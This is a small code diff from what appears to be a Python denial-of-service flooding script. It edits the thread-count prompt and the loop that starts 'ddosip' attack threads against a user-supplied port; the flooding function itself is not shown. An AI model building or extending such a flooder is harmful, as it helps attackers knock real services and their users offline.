@@ -87,12 +87,12 @@ if vibor == 1:
     port = int(input("Port: "))
 
     try:
-        threads = int(input("Threads: "))
+        threads = int(input("Threads[max 1000]: "))
     except ValueError:
         exit("Threads count is incorrect!")
 
     for i in range(0, threads):
-        ipddos = threading.Thread(target=ddosip)
+        ipddos = threading.Thread(target=ddosip, args=(1,))
         ipddos.start()
         print(colorama.Fore.GREEN + str(i + 1) + " thread started!")
 else:
